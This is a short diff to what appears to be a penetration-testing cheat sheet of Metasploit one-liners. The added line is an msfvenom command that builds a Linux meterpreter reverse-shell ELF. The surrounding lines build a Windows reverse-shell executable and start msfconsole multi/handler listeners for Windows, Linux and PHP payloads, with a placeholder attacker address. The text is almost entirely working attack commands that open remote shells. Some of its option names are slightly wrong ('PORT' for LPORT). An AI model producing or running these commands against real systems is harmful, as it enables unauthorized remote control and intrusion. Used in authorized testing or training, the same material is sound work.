@@ -5,6 +5,7 @@ Create payload and listener "One Liners"
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=443 -f exe > ./reverse3.exe
 msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST xxx.xxx.xxx.xxx; set PORT 1234; run"
 # Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=1234 -f elf > ./shell.elf
 msfconsole -x "use exploit/multi/handler; set payload linux/x86/meterpreter_reverse_tcp; set LHOST xxx.xxx.xxx.xxx; set PORT 1234; run"
 # PHP
 msfconsole -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST xxx.xxx.xxx.xxx; set PORT 1234; run"
